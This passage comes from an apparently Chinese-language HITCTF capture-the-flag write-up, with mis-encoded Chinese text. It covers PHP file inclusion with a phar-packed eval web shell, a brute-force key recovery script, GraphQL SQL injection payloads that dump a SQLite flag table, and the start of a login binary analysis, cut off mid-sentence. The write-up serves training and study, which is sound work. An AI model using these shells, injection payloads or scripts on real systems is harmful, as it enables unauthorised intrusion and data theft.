class="number">4</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">1</span>]) &gt;&gt; <span class="number">1</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[<span class="number">4</span> * ord(s[<span class="number">1</span>]) &amp; <span class="number">4</span> | (ord(s[<span class="number">2</span>]) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span>]</span><br><span class="line">    tmp += chart[(ord(s[<span class="number">2</span>]) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">7</span>]</span><br><span class="line">    tmp += chart[ord(s[<span class="number">2</span>]) &amp; <span class="number">7</span>]</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">                t = chr(i)+chr(j)+chr(k)</span><br><span class="line">                <span class="keyword">if</span> f(t) == a1[n*<span class="number">8</span>:n*<span class="number">8</span>+<span class="number">8</span>]:</span><br><span class="line">                    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    flag += foo(_)</span><br><span class="line">    <span class="keyword">print</span> flag   <span class="comment">#HITCTF&#123;3asy_b4se_3ight:)&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="BabyWrite"><a href="#BabyWrite" class="headerlink" title="BabyWrite"></a>BabyWrite</h3><p>ä¸»é¡µå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå¯æŸ¥çœ‹æºä»£ç <br><code>http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=login</code></p><p>login.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;CTF&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">  Ã§Â™Â»Ã©Â™Â†Ã¨Â§Â£Ã©Â”ÂÃ¦Â›Â´Ã¥Â¤ÂšÃ¥ÂŠÂŸÃ¨ÂƒÂ½</span><br><span class="line">  &lt;form action=<span class="string">"login.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    Ã§Â”Â¨Ã¦ÂˆÂ·Ã¥ÂÂ : &lt;input name=<span class="string">"username"</span> placeholder=<span class="string">"username"</span>&gt;&lt;br/&gt;</span><br><span class="line">    Ã¥Â¯Â†Ã§ Â : &lt;input name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span>&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Ã§Â™Â»Ã©Â™Â†"</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username === <span class="string">"admin"</span> &amp;&amp; sha1(md5($password)) === $admin_hash)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login seccess!");&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'debug'</span>] === <span class="string">'hitctf'</span>)&#123;</span><br><span class="line">          $logfile = <span class="string">"log/"</span>.$username.<span class="string">".log"</span>;</span><br><span class="line">          $content = $username.<span class="string">" =&gt; "</span>.$password;</span><br><span class="line">          file_put_contents($logfile, $content);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Login failed!");&lt;/script&gt;'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Please input username and password!");&lt;/script&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>åŒ…å«config.phpæœ‰adminçš„hash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$admin_hash = &quot;df650edd89a1abfb417124133daf4c103e6d2e97&quot;;</span><br></pre></td></tr></table></figure></p><p>æ€è·¯ï¼šä½ ç”¨è¾“å…¥çš„usernameå’Œpasswordï¼Œå†™å…¥logï¼Œç„¶åæ–‡ä»¶åŒ…å«ï¼Œæœ¬é¢˜ä¸­é—´ç”¨äº†<code>=&gt;</code>åšè¿æ¥ï¼Œé¢„æœŸè§£æ³•ç”¨pharã€‚éœ€è¦ä¿®æ”¹php.iniçš„é…ç½®ï¼Œå»æ‰<code>phar.readonly</code>æ³¨é‡Šå¹¶æ”¹æˆoff</p><p>1.pharç”Ÿæˆæ—¶ï¼Œphpæ–‡ä»¶å¸¦æœ‰<code>=&gt;</code>å…³é”®å­—ï¼Œå»ºä¸€ä¸ªcæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ä¸€å¥è¯<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'c.phar'</span>, <span class="number">0</span>, <span class="string">'c.phar'</span>);</span><br><span class="line">$phar-&gt;buildFromDirectory(<span class="string">'./c'</span>);</span><br><span class="line">$phar-&gt;setStub($phar-&gt;createDefaultStub(<span class="string">'e.php'</span>, <span class="string">' =&gt; .php'</span>));</span><br><span class="line">$phar-&gt;compressFiles(Phar::GZ);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>EXP:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">s = <span class="string">" =&gt; "</span></span><br><span class="line">host = <span class="string">"120.24.215.80"</span></span><br><span class="line">port = <span class="number">10012</span></span><br><span class="line">url = <span class="string">"http://%s:%d/login.php?debug=hitctf"</span> % (host, port)</span><br><span class="line">content = open(<span class="string">'c.phar'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">username = content[:<span class="number">15</span>]</span><br><span class="line">password = content[<span class="number">15</span> + len(s):]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] User : [%s]"</span> % (urllib.quote(username))</span><br><span class="line">data = &#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:password&#125;</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">print</span> response.content</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] http://%s:%d/?page=phar://log/%s.log/c&amp;c=phpinfo();"</span> % (host, port, urllib.quote(username))</span><br></pre></td></tr></table></figure></p><p>2.ç›´æ¥ä¼ pharï¼Œç”±äºå¼€å¤´åŠ äº†ä¸œè¥¿ï¼Œéœ€è¦ä¿®æ”¹pharåŒ…çš„æ ¡éªŒå€¼ã€‚(<a href="http://php.net/manual/en/phar.fileformat.signature.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.signature.php</a>)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'shell.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$phar[<span class="string">'shell.php'</span>] = <span class="string">'&lt;?php eval($_POST[\'cmd\']);?&gt;'</span> ;</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>ç•™æ„æœ€å28ä¸ªå­—èŠ‚ï¼Œæœ€å4å­—èŠ‚æ˜¯å›ºå®šæ ‡è¯†ï¼Œå€’æ•°4-8å­—èŠ‚æ˜¯hashç±»å‹ï¼Œè¿™é‡Œæ˜¯0x02ä»£è¡¨sha1ï¼Œç”±äºå¼€å¤´ä¼šå¢åŠ å­—èŠ‚ï¼Œåˆ æ‰æœ€å28å­—èŠ‚ï¼ŒåŠ ä¸Šå¢åŠ çš„å¼€å¤´ï¼Œé‡æ–°è®¡ç®—sha1ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSha1</span><span class="params">(filename)</span>:</span> </span><br><span class="line">    sha1Obj = sha1()</span><br><span class="line">    <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        sha1Obj.update(f.read())</span><br><span class="line">    <span class="keyword">return</span> sha1Obj.hexdigest()</span><br></pre></td></tr></table></figure></p><h3 id="SecurePY"><a href="#SecurePY" class="headerlink" title="SecurePY"></a>SecurePY</h3><p>å¯å‚è€ƒï¼š<a href="https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/" target="_blank" rel="noopener">https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/</a></p><p><a href="http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc" target="_blank" rel="noopener">http://123.206.83.157:8000/<strong>pycache</strong>/app.cpython-35.pyc</a>åç¼–è¯‘å¾—åˆ°ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit http://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, render_template</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_key = os.environ[<span class="string">'KEY'</span>]</span><br><span class="line">flag_enc = <span class="string">'9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, flag_enc = flag_enc)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">'/'</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">()</span>:</span></span><br><span class="line">    req = request.json</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">None</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    key = <span class="keyword">None</span>[<span class="string">'key'</span>]</span><br><span class="line">    <span class="keyword">if</span> len(key) != len(flag_key):</span><br><span class="line">        <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(key, flag_key):</span><br><span class="line">        <span class="keyword">if</span> ord(x) ^ ord(y):  <span class="comment">#æ³¨æ„è¿™é‡Œï¼Œå¯ä»¥é€šè¿‡è¿™é‡ŒæŠ¥é”™æ¥ç¡®å®škeyé•¿åº¦</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(result = <span class="keyword">False</span>)</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, <span class="string">b'0000000000000000'</span>)</span><br><span class="line">    plain_text = cryptor.decrypt(a2b_hex(flag_enc))</span><br><span class="line">    flag = plain_text.decode(<span class="string">'utf-8'</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> jsonify(result = <span class="keyword">True</span>, flag = flag)</span><br><span class="line"></span><br><span class="line">getflag = app.route(<span class="string">'/getflag'</span>, methods = [</span><br><span class="line">    <span class="string">'POST'</span>])(getflag)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p><p>å¯¹äºNoneç±»å‹ï¼Œord(None)ä¼šå´©æºƒæ‰ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; key = [None,None]</span><br><span class="line">&gt;&gt;&gt; ord(key[1])</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: ord() expected string of length 1, but NoneType found</span><br></pre></td></tr></table></figure></p><p>JSONé‡Œé¢nullä¼šåœ¨pythoné‡Œé¢è½¬æ¢æˆnoneã€‚</p><p>å½“POSTæ•°æ®ä¸º<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>ï¼ˆ15ä¸ªnullï¼‰æ—¶ï¼šfalse</p><p>å½“POSTæ•°æ®ä¸º<code>{&quot;key&quot;:[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>ï¼ˆ16ä¸ªnullï¼‰æ—¶ï¼š500 Internal Server Errorï¼Œå¯ä»¥ç¡®å®škeyä¸º16ä½</p><p>åŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨falseå’Œ500æŠ¥é”™æ¥é€ä½çˆ†ç ´key</p><p>å½“POSTæ•°æ®ä¸º<code>{&quot;key&quot;:[&quot;a&quot;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>ï¼ˆ16ä¸ªnullï¼‰æ—¶ï¼šfalse</p><p>å½“POSTæ•°æ®ä¸º<code>{&quot;key&quot;:[&quot;5&quot;,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]}</code>ï¼ˆ16ä¸ªnullï¼‰æ—¶ï¼š500 Internal Server Error</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://123.206.83.157:8000/getflag"</span></span><br><span class="line">proxy = &#123;<span class="string">'http'</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</span><br><span class="line">key = [<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>,<span class="keyword">None</span>]</span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    key[index] = str(chr(i))</span><br><span class="line">    payload = &#123;<span class="string">"key"</span>:key&#125;</span><br><span class="line">    text = requests.post(url,json=payload,proxies=proxy).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"500 Internal Server Error"</span> <span class="keyword">in</span> text :</span><br><span class="line">      print(<span class="string">""</span>.join(key[:index+<span class="number">1</span>]))</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"true"</span> <span class="keyword">in</span> text:</span><br><span class="line">      print(<span class="string">""</span>.join(key))</span><br><span class="line">      exit()   <span class="comment">#5ecur3pPYpyPYk3y</span></span><br></pre></td></tr></table></figure><h3 id="BabyQuery"><a href="#BabyQuery" class="headerlink" title="BabyQuery"></a>BabyQuery</h3><p>æŠ“åŒ…çœ‹ä¸€ä¸‹postçš„æ•°æ®ï¼Œæ˜¯graphqlï¼Œä¸€ä¸ªæŸ¥è¯¢APIï¼Œç¼–ç æ˜¯base32<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=&#123; getscorebyid(id: &quot;GE======&quot;)&#123; id name score &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>éšä¾¿æ”¹ä¸€ä¸‹<code>getscorebyxx</code>ï¼Œå¯ä»¥çœ‹åˆ°æŠ¥é”™å‘ç°è¿˜æœ‰<code>getscorebyyourname</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[GraphQLError(&apos;Cannot query field &quot;getscoreby222&quot; on type &quot;Query&quot;. Did you mean &quot;getscorebyid&quot; or &quot;getscorebyyourname&quot;?&apos;,)]</span><br></pre></td></tr></table></figure><p>æµ‹è¯•å‘ç°idåªèƒ½1ä½æ•°ï¼Œé‚£ä¹ˆåªèƒ½ä»é‚£ä¹ˆå…¥æ‰‹ï¼Œå†™ä¸ªä»£ç æµ‹è¯•æ³¨å…¥ï¼Œhackbaræ— base32æ¯”è¾ƒéº»çƒ¦<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  base64 <span class="keyword">import</span> b32encode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://182.254.247.127:3001/graphql"</span></span><br><span class="line">payload = <span class="string">"1' or '1'='1"</span></span><br><span class="line">q = <span class="string">'&#123; getscorebyyourname(name: "%s")&#123; name score &#125; &#125;'</span>%(b32encode(payload))</span><br><span class="line">r = requests.post(url=url,data=&#123;<span class="string">"query"</span> : q&#125;)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>æµ‹è¯•å‘ç°å­˜åœ¨æ³¨å…¥ï¼Œ<code>payload = &quot;1&#39; union select 1-- &quot;</code>è¿”å›<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &quot;1&apos; union select 1-- &quot;), (u&apos;score&apos;, &apos;1&apos;)]))])</span><br></pre></td></tr></table></figure></p><p>å¸¸ç”¨å¥—è·¯æµ‹è¯•<code>payload = &quot;1&#39; union select database()-- &quot;</code>ï¼Œå‘ç°ä¸æ˜¯mysqlï¼Œæ˜¯sqliteã€‚å…ˆçˆ†ä¸€ä¸‹è¡¨ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;-1&apos; UNION ALL SELECT name FROM sqlite_master WHERE type=\&quot;table\&quot; limit 1,1--&quot;</span><br><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &apos;-1\&apos; UNION ALL SELECT name FROM sqlite_master WHERE type=&quot;table&quot; limit 1,1--&apos;), (u&apos;score&apos;, &apos;Secr3t_fl4g&apos;)]))])</span><br></pre></td></tr></table></figure></p><p>å‘ç°fSecr3t_fl4gè¡¨äº†ï¼Œææ‚~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;-1&apos; UNION ALL SELECT * from Secr3t_fl4g--&quot;</span><br><span class="line">OrderedDict([(u&apos;getscorebyyourname&apos;, OrderedDict([(u&apos;name&apos;, &quot;-1&apos; UNION ALL SELECT * from Secr3t_fl4g--&quot;), (u&apos;score&apos;, &apos;HITCTF&#123;fee26d3a146a404e106b1ed93156f30e&#125;&apos;)]))])</span><br></pre></td></tr></table></figure></p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to 7HxzZ login system!"</span>);</span><br><span class="line">  v4 = login();</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Login successful\nBut you have no permission to get the flag!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How can you login successful as root!\nThere must be something wrong with the login function,let me check again!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Checking......"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( check() &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Don't fool me, you are not the true root user!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This is your flag: "</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œéœ€è¦ä½¿ç”¨rootç™»å½•ï¼Œæ¥çœ‹ä¸€ä¸‹login()<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> n; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">255</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Username: "</span>);</span><br><span class="line">  n = read_input_raw((<span class="keyword">int</span>)username, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Password: "</span>);</span><br><span class="line">  v3 = read_input_raw((<span class="keyword">int</span>)password, <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(username, <span class="string">"root"</span>, n) &amp;&amp; !<span class="built_in">strncmp</span>(password, <span class="string">"passwd_has_be_changed_in_remote_"</span>, v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œçš„å¯†ç æ¯”è¾ƒæœ‰é—®é¢˜ï¼Œä½ è¾“å…¥å¤šå°‘ä½ï¼Œå°±æ¯”è¾ƒå¤šå°‘ä½ï¼Œä¾‹å¦‚ä½ åªè¾“å…¥ä¸€ä½ï¼Œé‚£ä¹ˆå°±åªæ¯”è¾ƒç¬¬ä¸€ä½æ˜¯ä¸æ˜¯è·Ÿrootå¯†ç ä¸€æ 